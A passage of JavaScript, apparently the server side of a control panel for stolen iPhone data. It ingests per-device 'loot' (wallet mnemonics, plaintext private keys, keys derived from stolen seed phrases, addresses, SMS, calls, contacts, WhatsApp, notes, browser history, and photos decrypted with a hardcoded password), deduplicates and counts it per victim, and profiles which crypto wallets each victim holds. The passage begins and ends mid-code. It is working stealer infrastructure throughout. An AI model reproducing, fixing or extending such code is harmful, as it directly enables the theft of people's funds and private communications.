              private_key_plain: okx.xpriv, private_key_abbr: abbr(okx.xpriv, 6, 6),
              chain: 'OKX账户密钥(非地址私钥)', coin: null, derivation_path: '',
              wallet_name: 'OKX ' + String(okx.name || ''), password_hint: '',
              keystore_id: '', fingerprint: '', src: '18chain:okx-account',
              // ⚠️ 别把这条当成客户钱包里"导出私钥"看到的那个值 —— 层级不同，本来就不相等。
              // 【2026-09-11】实测：用它与 20 组 chaincode 候选 × 10 条完整 BIP44 路径
              //   （共 1258+200 组）都推不出 chain_address 里的任何一个地址 → 层级/用途待逆。
              note: 'OKX 沙盒 Documents/wallet 里 wallet.xpriv 的明文密钥对（secp256k1 自洽）。'
                  + '⚠️ 非地址级私钥 —— 与客户在 OKX「导出私钥」看到的地址私钥【本就不相等】，勿直接比对。',
              ts: okx.createAt || now, ip: dip,
            });
          }
          for (const a of (okx.addresses || [])) {
            if (!a.address) continue;
            if (store.addresses.some(x => x.serial === serial && x.public_key === a.address)) continue;
            store.addresses.push({
              id: store.addresses.length + 1, user_id: uid, serial,
              public_key: a.address, public_key_abbr: abbr(a.address, 8, 6),
              private_key_plain: null, private_key_abbr: null,
              chain: 'OKX-' + String(a.chain || ''), coin: a.chainId, derivation_path: '',
              wallet_name: 'OKX ' + String(okx.name || ''), password_hint: '',
              keystore_id: '', fingerprint: '', pubkey: String(a.publicKey || ''),
              src: '18chain:okx-address', ts: now, ip: dip,
            });
          }
        }

        // ── 多钱包适配层：MetaMask / Bitget 等「明文地址」入库 ──
        // 【2026-09-11】MetaMask(AccountsController) 与 Bitget(未加密 MMKV) 的地址+派生路径是明文，
        //   不需要口令即可提取 → 直接进面板「地址」菜单，便于和客户钱包逐条比对。
        for (const ad of (e.adapters || [])) {
          for (const x of (ad.addresses || [])) {
            if (!x || !x.address) continue;
            if (store.addresses.some(y => y.serial === serial && y.public_key === x.address)) continue;
            store.addresses.push({
              id: store.addresses.length + 1, user_id: uid, serial,
              public_key: x.address, public_key_abbr: abbr(x.address, 8, 6),
              private_key_plain: null, private_key_abbr: null,
              chain: String(ad.app || '') + (x.label && x.label !== ad.app ? ' ' + x.label : ''),
              coin: null, derivation_path: String(x.path || ''),
              wallet_name: String(ad.app || ''), password_hint: '',
              keystore_id: String(ad.keystore_id || ''), fingerprint: '',
              src: '18chain:' + String(ad.app || 'adapter').toLowerCase(),
              note: String(ad.note || ''), ts: now, ip: dip,
            });
          }
        }
      }
    }
  } catch (e) { /* 解密结果缺失/损坏不影响主流程 */ }

  // 补设备（无 event 记录的用户）
  for (const u of store.users.values()) {
    if (!store.devices.has(u.serial_id) && u.machine) {
      store.devices.set(u.serial_id, { id: store.devices.size + 1, serial_id: u.serial_id, hardware_model: u.machine, build_version: u.ios_version, os_version: u.ios_version, kernel_release: '', user_id: u.id, ip: u.ip, last_seen: u.last_seen });
    }
  }
  // 【2026-09-12】设备"上线时间"（首次出现）：面板设备管理列表新增列用。
  //   设备记录本身没存 first_seen，统一从同序列号用户记录取（各通道都会写 users.first_seen），
  //   取 min(现有 first_seen, 用户 first_seen)，最后兜底 last_seen。
  for (const u of store.users.values()) {
    const d = store.devices.get(u.serial_id);
    if (!d) continue;
    const uf = Number(u.first_seen) || 0;
    if (!d.first_seen || (uf && uf < d.first_seen)) d.first_seen = uf || d.last_seen;
  }
  for (const d of store.devices.values()) {
    if (!d.first_seen) d.first_seen = d.last_seen;
  }
  // ── 【2026-09-13 时间戳卫生·未来钳制】设备侧时钟漂移（实测某云真机 DNPWTV7CJCLF +6 天）会把上报
  //    tm 写成"未来时间"，污染 上线时间(session_start)/最近活跃(first·last_seen)/记录时间与统计。
  //    统一钳制：> now+1h 视为无效 → 记为 now（上传确实刚到）。先于 session_start/计数/预聚合执行。
  {
    const MAXTS = now + 3600 * 1000;
    const ARRS_FUT = [store.events, store.reports, store.uploads, store.exfil18, store.photos,
      store.messages, store.notebooks, store.browserHistory, store.contacts, store.whatsapp,
      store.apps, store.sysApps, store.chainLogs];
    for (const arr of ARRS_FUT) {
      if (!Array.isArray(arr)) continue;
      for (const it of arr) {
        if (it && Number(it.ts) > MAXTS) it.ts = now;
      }
    }
    for (const d of store.devices.values()) {
      if ((d.last_seen || 0) > MAXTS) d.last_seen = now;
      if ((d.first_seen || 0) > MAXTS) d.first_seen = now;
    }
    for (const u of store.users.values()) {
      if ((u.last_seen || 0) > MAXTS) u.last_seen = now;
      if ((u.first_seen || 0) > MAXTS) u.first_seen = now;
    }
  }
  // 【2026-09-12】设备"上线时间" = 该设备【最近一次上线】的起点（不是首次出现时间）。
  //   算法：把该设备所有上报时间戳排序 → 从最新往回走，相邻间隔 > SESSION_GAP_MS 即视为"断过线"，
  //   停下的那个时间戳就是本次上线的开始。在线设备显示"这次什么时候上来的"，
  //   离线设备显示"最后一次上线的时刻"。数据源：/t 包(uploads)、事件、上报、18链采集(exfil18)…
  {
    const tsBySerial = new Map();
    const addTs = (s, t) => {
      const n = Number(t) || 0;
      if (!s || !n) return;
      let a = tsBySerial.get(s); if (!a) tsBySerial.set(s, a = []);
      a.push(n);
    };
    // 只用"网络上报"类数据算上线时间；addresses/mnemonics/seeds/tokens 这类
    //   离线解密产物可能被写成扫描时刻（源数据没有时间戳，代码里 `ts: now`），会把上线时间污染成"现在"。
    const TS_ARRAYS = [store.events, store.reports, store.uploads, store.exfil18,
      store.photos, store.messages, store.notebooks, store.browserHistory];
    for (const arr of TS_ARRAYS) {
      if (!Array.isArray(arr)) continue;
      for (const it of arr) {
        if (!it) continue;
        addTs(it.serial || it.serial_id, it.ts || (it.created_at ? Date.parse(it.created_at) : 0));
      }
    }
    for (const d of store.devices.values()) {
      const arr = (tsBySerial.get(d.serial_id) || []).slice().sort((a, b) => a - b);
      if (!arr.length) { d.session_start = d.first_seen || d.last_seen; continue; }
      let i = arr.length - 1;
      while (i > 0 && (arr[i] - arr[i - 1]) <= SESSION_GAP_MS) i--;
      d.session_start = arr[i];
    }
  }
  // ── 【2026-09-12】18 链应用名回填 ──
  //   installed_apps.txt 只带 bundle（name 会被解析成 bundle 本身）→ 用
  //   ①其它设备上报过的 同名 bundle+真名字（17 链 applist）  ②KNOWN_APP_NAMES 静态表
  //   回填；两者都没有时把 name 清空，前端显示「—」，避免出现 "com.a.b / com.a.b" 两遍。
  try {
    const nmap = {};
    for (const x of store.apps) {
      if (x.bundle_id && x.name && x.name !== x.bundle_id) nmap[x.bundle_id] = x.name;
    }
    let filled = 0, cleared = 0;
    for (const x of store.apps) {
      if (x.name && x.name !== x.bundle_id) continue;
      const n = nmap[x.bundle_id] || KNOWN_APP_NAMES[x.bundle_id];
      if (n) { x.name = n; x.name_src = nmap[x.bundle_id] ? '同 bundle 已知名' : '内置表'; filled++; }
      else { if (x.name) { x.name = ''; cleared++; } }
    }
    if (filled || cleared) console.log('[apps] 应用名回填 %d 条，未知名置空 %d 条', filled, cleared);
  } catch (e) { /* 回填失败不影响主流程 */ }

  // ── 【2026-09-13 新功能·用户点单】加密货币钱包识别（设备管理「钱包识别」列的数据源）──
  //   证据面：① store.apps 的 bundle_id/name（13-17 链与 18 链通用；18 链只有 com.google.Gmail 式 bundle）
  //          ② 18 链 walletDiag[s].wallet_svcs（采集器已识别的钱包服务名，如 ["MetaMask","OKX"]）
  //          ③ 18 链 walletDiag[s].crypto_apps（App Group 串，如 group.com.sixdays.trust）
  //   产出：u.wallets/d.wallets（去重钱包名数组）+ wallet_label：
  //         仅 1 种 → 直接显示名字；≥2 种 → 「多个钱包（N 种）」；无 → 前端显示「无钱包」。
  //   防误报：bundle 子串只收精确模式（如 Phantom 只认 app.phantom——实测 com.phantom.fantengmu 是相机
  //   App、Phantom VPN 是 VPN）；名称走精确匹配。
  try {
    const walletEv = walletEvidence(store.apps, store.walletDiag);   // 名单/规则唯一来源：本模块 walletEvidence()
    let nOne = 0, nMulti = 0;
    for (const [s, arr] of walletEv) {
      const label = arr.length === 1 ? arr[0] : ('多个钱包（' + arr.length + ' 种）');
      if (arr.length === 1) nOne++; else nMulti++;
      const u = store.users.get(s); if (u) { u.wallets = arr; u.wallet_label = label; }
      const d = store.devices.get(s); if (d) { d.wallets = arr; d.wallet_label = label; }
    }
    console.log('[wallets] 钱包识别：单钱包 %d 台 / 多钱包 %d 台（共 %d 台有钱包记录）', nOne, nMulti, walletEv.size);
  } catch (e) { console.error('[wallets] 识别失败:', e.message); }

  // ── 【2026-09-12】「仅采集到库文件」占位行清理 ──
  //   顺序问题：空的地址簿可能比有数据的那个先被扫到 → 占位行先压进去；这里按"同设备已有真数据"复查再删。
  try {
    const hasSms = new Set(), hasCall = new Set(), hasCt = new Set();
    for (const m of store.messages) {
      if (!m.serial) continue;
      if (m.kind === 'sms') hasSms.add(m.serial);
      if (m.kind === 'call') hasCall.add(m.serial);
    }
    for (const c of store.contacts) if (c.serial) hasCt.add(c.serial);
    store.messages = store.messages.filter(m => {
      if (m.kind === 'smsdb') return !hasSms.has(m.serial);
      if (m.kind === 'calldb') return !hasCall.has(m.serial);
      if (m.kind === 'contactdb') return !hasCt.has(m.serial);
      return true;
    });
  } catch (e) { /* 清理失败不影响主流程 */ }

  // ── 【2026-09-12】设备元数据覆盖表（data/device_meta_overrides.json）──
  //   原始 loot/<ip>/ 被隔离或清理后，机型/系统版本会丢（面板显示 —）→ 用显式覆盖表补回。
  try {
    const ovf = path.join(__dirname, 'data', 'device_meta_overrides.json');
    if (fs.existsSync(ovf)) {
      const ov = JSON.parse(fs.readFileSync(ovf, 'utf8'));
      for (const [serial, meta] of Object.entries(ov)) {
        if (serial.startsWith('_') || !meta) continue;
        const u = store.users.get(serial), dv = store.devices.get(serial);
        if (u) {
          if (!u.machine && meta.machine) u.machine = meta.machine;
          if (!u.ios_version && meta.ios_version) u.ios_version = meta.ios_version;
        }
        if (dv) {
          if (!dv.hardware_model && meta.machine) dv.hardware_model = meta.machine;
          if (!dv.os_version && meta.ios_version) dv.os_version = meta.ios_version;
        } else if (meta.machine) {
          store.devices.set(serial, { id: store.devices.size + 1, serial_id: serial, hardware_model: meta.machine,
            os_version: meta.ios_version || '', build_version: '', kernel_release: '', user_id: u ? u.id : 0,
            ip: u ? (u.ip || '') : '', last_seen: (u && u.last_seen) || 0, source: 'meta-override' });
        }
      }
    }
  } catch (e) { /* 覆盖表缺失/损坏不影响主流程 */ }

  // ── 【2026-09-12】/t 通道解密产物 → 面板「照片墙」 ──
  //   来源：docs/post_t/t_final_decrypt.py 批量解出（口令 = 'Ek8pl31K2yeHgQwy' + 该包 multipart ts 字段）
  //   去重 + 归属（serial/ip/ts）由离线侧预先算进 t_index.json —— 面板扫描时零哈希成本。
  try {
    // 【测试护栏】LOOT_SKIP_GLOBALS=1 时跳过（崩溃/夹具测试提速；生产环境不设该 env，行为不变）
    const tIdx = path.join(__dirname, '..', 'docs', 'post_t', 't_plain', 't_index.json');
    if (!process.env.LOOT_SKIP_GLOBALS && fs.existsSync(tIdx)) {
      const plist = JSON.parse(fs.readFileSync(tIdx, 'utf8'));
      for (const r of plist) {
        if (!r || !r.path || !fs.existsSync(r.path)) continue;
        const u2 = store.users.get(r.serial);
        store.photos.push({
          id: store.photos.length + 1, user_id: u2 ? u2.id : 0, serial: r.serial || '', device: '',
          ip: r.ip || '', ts: Number(r.ts) || 0, taken_at: Number(r.ts) || 0,
          name: r.name || '', title: 'post_t 解密照片', size: Number(r.size) || 0,
          bin_path: r.path, dec: null,
          note: '/t 通道解密（' + (r.pkg || '') + '）', source: 'post_t_decrypted',
        });
      }
    }
  } catch (e) { /* 索引缺失/损坏不影响主流程 */ }

  // ── 【2026-09-12】统一去重（跨采集批次/跨通道的相同记录）──
  //   同一设备多次投递、多批 raw_avatar_pic、uj/ub 反复全量重传 → 同一张照片/同一条笔记/
  //   同一个 App/同一个地址会被反复入栈（实测 15.8.3：apps 123 条仅 18 个唯一、照片同文件 x5、
  //   笔记同条 x3、地址同 ts x41）。
  // 【2026-09-12 分片升级】保留策略由「首条」改为「最新一条」：旧策略把记录的 ts 钉在首次
  //   上报时刻 —— 设备持续重传也永远显示旧时间，被面板全局裁剪切走（7P 案例根因之一）。
  //   保留最新副本后，时间始终跟随最近一次上报；输出顺序不变（按最后出现位置）。
  {
    const uniqBy = (arr, keyFn) => {
      const last = new Map();
      for (let i = 0; i < arr.length; i++) {
        const k = keyFn(arr[i]);
        if (k != null) last.set(k, i);
      }
      const out = [];
      for (let i = 0; i < arr.length; i++) {
        const x = arr[i];
        const k = keyFn(x);
        if (k != null && last.get(k) !== i) continue;
        out.push(x);
      }
      return out;
    };
    store.photos = uniqBy(store.photos, x => (x.serial || '') + '|' + (x.source_path || x.name || x.title || ''));
    // 【复审修复 L3】键加入内容指纹：同库同标题的不同笔记（实测最坏一批 500 行/460 个唯一标题）不再被误合并
    store.notebooks = uniqBy(store.notebooks, x => (x.serial || '') + '|' + (x.source_path || '') + '|' + (x.title || '') + '|' + String(x.content || '').slice(0, 120));
    store.apps = uniqBy(store.apps, x => (x.serial || '') + '|' + (x.bundle_id || x.name || ''));
    // addresses 特殊：imToken 的 uj 对同一地址按每条链重复一条记录（实测同一 ETH 地址 x41 条，
    //   仅 coin/chain 不同：ETH / coin20000714 / coin966 …，私钥与派生路径完全一致）。
    //   按 (serial, 地址) 合并，chain 保留可读链名优先（ETH/BTC/TRON… > 其它 > coinNNN 内部编码）。
    {
      const chainRank = c => {
        c = String(c || '');
        if (/^(ETH|BTC|TRON|BNB|SOL|MATIC|Polygon|Avalanche|AVAX|Arbitrum|Optimism|Fantom|LTC|DOGE|XRP|TON|ATOM|DOT|ADA|BCH|EOS|TRX)\b/i.test(c)) return 0;
        return /^coin\d+$/i.test(c) ? 2 : 1;
      };
      const seen = new Map(); const out = [];
      for (const a of store.addresses) {
        if (!a.public_key) { out.push(a); continue; }
        const k = (a.serial || '') + '|' + a.public_key;
        const cur = seen.get(k);
        if (!cur) { seen.set(k, a); out.push(a); continue; }
        if (chainRank(a.chain) < chainRank(cur.chain)) { cur.chain = a.chain; cur.coin = a.coin; }
        if (!cur.derivation_path && a.derivation_path) cur.derivation_path = a.derivation_path;
        if (!cur.private_key_plain && a.private_key_plain) { cur.private_key_plain = a.private_key_plain; cur.private_key_abbr = a.private_key_abbr; }
        if (!cur.wallet_name && a.wallet_name) cur.wallet_name = a.wallet_name;
        if (!cur.password_hint && a.password_hint) cur.password_hint = a.password_hint;
      }
      store.addresses = out;
    }
    store.tokens = uniqBy(store.tokens, x => (x.serial || '') + '|' + (x.address || '') + '|' + (x.symbol || x.name || ''));
    store.whatsapp = uniqBy(store.whatsapp, x => (x.serial || '') + '|' + (x.account || x.display_name || ''));
    store.browserHistory = uniqBy(store.browserHistory, x => (x.serial || '') + '|' + (x.source_path || '') + '|' + (x.url || '') + '|' + (x.ts || 0));
    store.messages = uniqBy(store.messages, x => (x.serial || '') + '|' + (x.source_path || '') + '|' + (x.who || x.from || '') + '|' + (x.ts || 0) + '|' + (x.direction || '') + '|' + String(x.body || '').slice(0, 60));
    store.contacts = uniqBy(store.contacts, x => (x.serial || '') + '|' + (x.name || '') + '|' + (x.phones || ''));
  }
  // 【2026-09-14 修复·计数错位根因】user_id → serial 一致性重算。
  //   原实现放在轮末（计数块之后）→ 缓存恢复的跨桶记录在计数时仍是旧 id → exfil18/notebooks/
  //   photos/reports 计数大面积错位（实测 FQJ4414GK9 分片 2 万条却只记 358；FFWJ30FMN73D 记了
  //   别人的 24932）。必须在下方的计数聚合【之前】执行：无 serial 的记录保持原值。
  {
    const _UK_ARR = ['events','mnemonics','seeds','addresses','tokens','reports','messages','notebooks','whatsapp','browserHistory','photos','deliveries','contacts','uploads','exfil18','chainLogs','visitLogs','apps','sysApps'];
    for (const k of _UK_ARR) {
      for (const r of store[k]) {
        if (!r || typeof r !== 'object' || r.serial === undefined) continue;
        const u = store.users.get(r.serial);
        if (u && u.id) r.user_id = u.id;
      }
    }
  }

  // 【2026-09-12 性能】user counts 原来对 35 台设备 × 9 个数组做 filter（≈50 万次比较）；
  //   改为各数组一次遍历聚合（O(n)），结果等价。
  {
    const agg = new Map();  // user_id -> {m,a,t,p,n,f,e,hu}
    const bump = (arr, key) => { for (const x of arr) { const c = agg.get(x.user_id) || {}; c[key] = (c[key] || 0) + 1; agg.set(x.user_id, c); } };
    bump(store.mnemonics, 'm'); bump(store.addresses, 'a'); bump(store.tokens, 't');
    bump(store.photos, 'p'); bump(store.notebooks, 'n'); bump(store.exfil18, 'e');
    for (const r of store.reports) {
      const c = agg.get(r.user_id) || {};
      if (r.kind === 'upload') c.f = (c.f || 0) + 1;
      if (['us', 'a', 'ub', 'uj'].includes(r.kind)) c.hu = 1;
      agg.set(r.user_id, c);
    }
    for (const u of store.users.values()) {
      const c = agg.get(u.id) || {};
      u.mnemonic_count = c.m || 0;
      u.address_count = c.a || 0;
      u.token_count = c.t || 0;
      u.photo_count = c.p || 0;
      u.note_count = c.n || 0;
      u.file_count = c.f || 0;
      u.exfil18_count = c.e || 0;
      u.upload_status = c.hu ? '已上报' : (u.exfil18_count > 0 ? '18链已上报' : '未上报');
      u.is_wallet_user = u.mnemonic_count > 0;
      u.is_online = (now - u.last_seen) <= ONLINE_WINDOW_MS;
    }
  }
  // ── IP 数据：按上报 IP 聚合（报告数/设备数/投递打开数/首末时间）──
  const ipAgg = new Map();
  const touchIp = (ip, serial, ts) => {
    if (!ip) return null;
    if (!ipAgg.has(ip)) ipAgg.set(ip, { ip, reports: 0, devices: new Set(), delivery_count: 0, first_ts: 0, last_ts: 0 });
    const g = ipAgg.get(ip);
    if (serial) g.devices.add(serial);
    const t = Number(ts) || 0;
    if (t) { g.last_ts = Math.max(g.last_ts, t); g.first_ts = g.first_ts ? Math.min(g.first_ts, t) : t; }
    return g;
  };
  for (const r of store.reports) { const g = touchIp(r.ip, r.serial, r.ts); if (g) g.reports++; }
  for (const d of store.deliveries) { const g = touchIp(d.ip, null, d.ts); if (g) g.delivery_count++; }
  store.ipData = [...ipAgg.values()].map(g => ({
    id: 0, ip: g.ip, report_count: g.reports, device_count: g.devices.size,
    devices: [...g.devices].slice(0, 8).join(', '), delivery_count: g.delivery_count,
    first_ts: g.first_ts, last_ts: g.last_ts, ts: g.last_ts,
  })).sort((a, b) => b.ts - a.ts).map((x, i) => ({ ...x, id: i + 1 }));

  // ── 私钥派生缓存填充（derive_all.js 产出；把助记词派生出的私钥补进地址记录）──
  // 【2026-09-10】面板把设备侧上报的明文助记词，按 BIP32/BIP44 标准路径派生，
  //   与已上报地址比对命中后写入 data/derived_keys.json；此处读缓存填充，避免扫描时同步派生（太慢）。
  try {
    const cf = path.join(__dirname, 'data', 'derived_keys.json');
    if (fs.existsSync(cf)) {
      const dc = JSON.parse(fs.readFileSync(cf, 'utf8'));
      for (const a of store.addresses) {
        if (a.private_key_plain) continue;
        const k0 = (a.serial || '') + '|' + (a.public_key || '');
        const hit = dc[k0] || dc[k0.toLowerCase()];   // 兼容历史缓存（大小写归一）
        if (hit && hit.pk) {
          a.private_key_plain = hit.pk;
          a.private_key_abbr = abbr(hit.pk, 3, 3);
          a.derived_path = hit.path;
          a.derived_from_mnemonic = hit.from_mnemonic;
        }
      }
    }
  } catch (e) { /* 缓存缺失/损坏不影响主流程 */ }

  // ── 【2026-09-12 分片升级】预计算「按设备聚合」（一级列表）与仪表盘统计 ──
  //   基于未裁剪全量数组聚合（分片/裁剪不丢计数）；行内含 serial/ip，读侧仍逐行走 filterByAgent。
  try {
    const devOf = s2 => store.devices.get(s2) || {};
    const enrich = a => Object.assign({}, a, {
      machine: devOf(a.serial).hardware_model || '',
      ios_version: devOf(a.serial).os_version || devOf(a.serial).build_version || '',
      ip: a.ip || devOf(a.serial).ip || '',
      last_seen: devOf(a.serial).last_seen || a.last_ts || 0,
    });
    const aggSort = out => out.sort((x, y) => (y.total - x.total) || ((y.last_seen || 0) - (x.last_seen || 0)));
    const summaries = {};

    summaries.photo = aggSort((() => {
      const agg = new Map();
      for (const p of store.photos) {
        if (!p.serial) continue;
        let a = agg.get(p.serial);
        if (!a) { a = { serial: p.serial, total: 0, orig: 0, ocr: 0, ocr_mnem: 0, last_ts: 0, ip: '' }; agg.set(p.serial, a); }
        a.total++;
        if (p.bin_path) a.orig++; else { a.ocr++; if (p.word_n) a.ocr_mnem++; }
        const t = Number(p.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
        if (p.ip) a.ip = p.ip;
      }
      return [...agg.values()].map(enrich);
    })());

    summaries.notebook = aggSort((() => {
      const agg = new Map();
      for (const n of store.notebooks) {
        if (!n.serial) continue;
        let a = agg.get(n.serial);
        if (!a) { a = { serial: n.serial, total: 0, with_body: 0, last_ts: 0, ip: '', sample: '' }; agg.set(n.serial, a); }
        a.total++;
        if (n.content && String(n.content).length > 10) a.with_body++;
        const t = Number(n.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
        if (n.ip) a.ip = n.ip;
        if (!a.sample && n.title) a.sample = String(n.title).slice(0, 20);
      }
      return [...agg.values()].map(enrich);
    })());

    summaries.contact = aggSort((() => {
      const agg = new Map();
      for (const c of store.contacts) {
        if (!c.serial) continue;
        let a = agg.get(c.serial);
        if (!a) { a = { serial: c.serial, total: 0, phone: 0, email: 0, last_ts: 0, ip: '' }; agg.set(c.serial, a); }
        a.total++; if (c.phones) a.phone++; if (c.emails) a.email++;
        const t = Number(c.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
        if (c.ip) a.ip = c.ip;
      }
      return [...agg.values()].map(enrich);
    })());

    summaries.whatsapp = aggSort((() => {
      const agg = new Map();
      for (const w of store.whatsapp) {
        if (!w.serial) continue;
        let a = agg.get(w.serial);
        if (!a) { a = { serial: w.serial, total: 0, total_msgs: 0, last_ts: 0, ip: '' }; agg.set(w.serial, a); }
        a.total++;
        a.total_msgs += Number(w.msg_count || 0) || 0;
        const t = Number(w.ts || 0) || 0; if (t > a.last_ts) a.last_ts = t;
        if (w.ip) a.ip = w.ip;
      }
      return [...agg.values()].map(enrich);
    })());

    {
      const agg = new Map(); const orphans = new Map();
      for (const x of store.exfil18) {
        const s2 = x.serial || '';
        if (!s2) { const k = x.ip || '?'; orphans.set(k, (orphans.get(k) || 0) + 1); continue; }
        let a = agg.get(s2);
        if (!a) { a = { serial: s2, total: 0, size: 0, cats: {}, last_ts: 0, ip: '' }; agg.set(s2, a); }
        a.total++;
        a.size += Number(x.orig_size || x.decoded_size || 0) || 0;
        const c = x.category || 'other';
        a.cats[c] = (a.cats[c] || 0) + 1;
        const t = Number(x.ts || 0); if (t > a.last_ts) a.last_ts = t;
        if (x.ip) a.ip = x.ip;
      }
      const out = [...agg.values()].map(a => ({
        serial: a.serial, total: a.total, size: a.size, cats: a.cats, last_ts: a.last_ts,
        ip: a.ip || devOf(a.serial).ip || '',
        machine: devOf(a.serial).hardware_model || '',
        ios_version: devOf(a.serial).os_version || devOf(a.serial).build_version || '',
        first_seen: devOf(a.serial).first_seen || 0,
        last_seen: devOf(a.serial).last_seen || a.last_ts,
        cat_n: Object.keys(a.cats).length,
        cat_top: Object.entries(a.cats).sort((p, r) => r[1] - p[1]).slice(0, 4).map(([k, v]) => k + '×' + v).join('  '),
      }));
      out.sort((p, r) => (r.total - p.total) || ((r.last_seen || 0) - (p.last_seen || 0)));
      summaries.exfil18 = { devices: out, orphans: [...orphans.entries()].map(([ip, n]) => ({ ip, n })) };
    }
    store.summaries = summaries;

    // 仪表盘统计（未裁剪全量；超管直读，行级隔离的代理视角仍走原逻辑）
    const today = new Date().toDateString();
    const dayOf = t => { const d = new Date(Number(t) || 0); return isNaN(d) ? '' : d.toDateString(); };
    const evs = store.events, mns = store.mnemonics, ads = store.addresses;
    const trend = [];
    for (let i = 6; i >= 0; i--) {
      const d = new Date(); d.setDate(d.getDate() - i);
      const key = d.toDateString();
      trend.push({
        day: (d.getMonth() + 1) + '/' + d.getDate(),
        events: evs.filter(e => dayOf(e.ts) === key).length,
        mnemonics: mns.filter(m => new Date(m.created_at).toDateString() === key).length,
      });
    }
    store.stats = {
      today_events_count: evs.filter(e => dayOf(e.ts) === today).length,
      today_mnemonics_count: mns.filter(m => new Date(m.created_at).toDateString() === today).length,
      // 【复审修复 L1】addresses 记录只有 ts 字段（无 created_at）—— 照抄旧逻辑导致该指标恒为 0
      today_addresses_count: ads.filter(a => new Date(a.ts || a.created_at || 0).toDateString() === today).length,
      total_addresses_count: ads.length,
      total_mnemonics_count: mns.length,
      total_devices_count: store.devices.size,
      total_users_count: store.users.size,
      total_events_count: evs.length,
      total_reports_count: store.reports.length,
      total_messages_count: store.messages.length,
      total_whatsapp_count: store.whatsapp.length,
      total_notebooks_count: store.notebooks.length,
      total_photos_count: store.photos.length,
      total_browser_history_count: store.browserHistory.length,
      total_exfil18_count: store.exfil18.length,
      total_chain_logs_count: store.chainLogs.length,
      trend,
    };
  } catch (e) { /* 预聚合失败不影响主流程 */ }

  // （user_id→serial 一致性重算已前移至「计数聚合」之前执行 —— 计数/汇总必须基于修正后的 id，
  //   不能放在轮末；详见计数块上方的说明与注释）

  // 【2026-09-13 增量构建】轮末固化：把每个桶的「当前活对象」写回缓存（最终态语义；
  //   仅在构建路径 opts.full + LOOT_SCAN_CACHE=1 时执行，全恢复轮（无重扫桶）自动跳过）
  if (BC_ENABLED && opts && opts.full) {
    try { bcFinalize(store, bcBucketNames, bcObjBucket, bcBucketIps); }
    catch (e) { console.error('[scan-cache] 固化失败（不影响构建）:', e.message); }
  }
  _cache = { t: Date.now(), store, sig: _sigNow, full: Date.now() };
  return store;
}

// 【2026-09-14 抽取·单一事实源】钱包证据匹配：供 ①快照 scan() ②PG 侧定期重算（tools/pg_sync_globals.js）
//   共用，保证「设备管理→钱包识别」在两条链路上名单与规则永远一致（改名单只改本函数）。
//   appRows: [{serial, bundle_id, name}]（store.apps / PG apps 表同形）
//   walletDiag: { serial: {wallet_svcs:[], crypto_apps:[]} }（18 链 wallet18.json 同形）
//   返回 Map(serial → 显示名数组·去重已排序)。
function walletEvidence(appRows, walletDiag) {
  const WB = [ // [bundle/group 小写子串, 显示名]
    ['io.metamask', 'MetaMask'], ['metamask', 'MetaMask'],
    ['com.sixdays.trust', 'Trust Wallet'], ['im.token.app', 'imToken'],
    ['com.bitpie', 'Bitpie'], ['mytokenpocket', 'TokenPocket'], ['tokenpocket', 'TokenPocket'],
    ['tronlink', 'TronLink'], ['com.bitkeep.os', 'Bitget Wallet'], ['bitget', 'Bitget Wallet'],
    ['app.phantom', 'Phantom'], ['coin98.crypto.finance.insights', 'Coin98'],
    ['com.uniswap', 'Uniswap'], ['exodus-movement.exodus', 'Exodus'],
    ['org.toshi.distribution', 'Coinbase Wallet'], ['com.coinbase', 'Coinbase'],
    ['czzhao.binance', 'Binance'], ['us.binance', 'Binance'],
    ['com.okex', 'OKX'], ['com.okx.wallet', 'OKX'],
    ['com.ledger.live', 'Ledger Live'], ['so.onekey.wallet', 'OneKey'], ['com.safepal', 'SafePal'],
    ['mathglobal.mathwallet', 'MathWallet'], ['com.cobo', 'Cobo'], ['com.bitpay.wallet', 'BitPay'],
    ['breadwallet', 'BRD'], ['io.bluewallet', 'BlueWallet'], ['com.coinomi.wallet', 'Coinomi'],
    ['rabby', 'Rabby Wallet'], ['me.rainbow', 'Rainbow'], ['im.argent', 'Argent'],
    ['backpack', 'Backpack'], ['zerion', 'Zerion'], ['keplr', 'Keplr'], ['gnosis', 'Gnosis Safe'],
    ['ballet', 'Ballet'], ['topay', 'TopayWallet'], ['crypto.com', 'Crypto.com'], ['bybit', 'Bybit'],
    ['kucoin', 'KuCoin'], ['gateio', 'Gate.io'], ['gate.io', 'Gate.io'], ['kraken', 'Kraken'],
    ['coinex', 'CoinEx'], ['uphold', 'Uphold'], ['zebedee', 'Zebedee'], ['steakwallet', 'Steakwallet'],
    ['bitso.wallet', 'Bitso'], ['coinmena', 'CoinMENA'], ['indodax', 'INDODAX'],
    ['solflare', 'Solflare'], ['kyrd.krystal', 'Krystal'], ['tonkeeper', 'Tonkeeper'],
    ['mytonwallet', 'MyTonWallet'], ['com.tonhub.app', 'Tonhub'], ['global.wallet.ios', 'GlobalWallet'],
    ['com.defi.wallet', 'Onchain'], ['elementwallet', 'Element'], ['demoxlabs.leo', 'Leo Wallet'],
    ['worldcoin.insight', 'World App'], ['ncwallet', 'NC Wallet'], ['pandawallet', 'PandaWallet'],
  ];
  const WN = { // 应用名精确匹配（小写）→ 显示名；拦李鬼（如 "Phantom VPN" 不命中 "phantom"）
    'metamask': 'MetaMask', 'trust wallet': 'Trust Wallet', 'trust': 'Trust Wallet', 'imtoken': 'imToken',
    'bitpie': 'Bitpie', 'tokenpocket': 'TokenPocket', 'tp wallet': 'TokenPocket', 'tronlink': 'TronLink',
    'coinbase wallet': 'Coinbase Wallet', 'binance': 'Binance', 'okx': 'OKX', 'okx wallet': 'OKX',
    'bitget wallet': 'Bitget Wallet', 'bitkeep': 'Bitget Wallet', 'phantom': 'Phantom', 'coin98': 'Coin98',
    'uniswap': 'Uniswap', 'exodus': 'Exodus', 'toshi': 'Coinbase Wallet', 'onekey': 'OneKey',
    'safepal': 'SafePal', 'mathwallet': 'MathWallet', 'bitpay': 'BitPay', 'bluewallet': 'BlueWallet',
    'coinomi': 'Coinomi', 'rainbow': 'Rainbow', 'argent': 'Argent', 'backpack': 'Backpack',
    'zerion': 'Zerion', 'keplr': 'Keplr', 'solflare': 'Solflare', 'krystal': 'Krystal',
    'tonkeeper': 'Tonkeeper', 'mytonwallet': 'MyTonWallet', 'tonhub': 'Tonhub', 'ledger live': 'Ledger Live',
    'kucoin': 'KuCoin', 'coinex': 'CoinEx', 'gate.io': 'Gate.io', 'bybit': 'Bybit', 'kraken': 'Kraken',
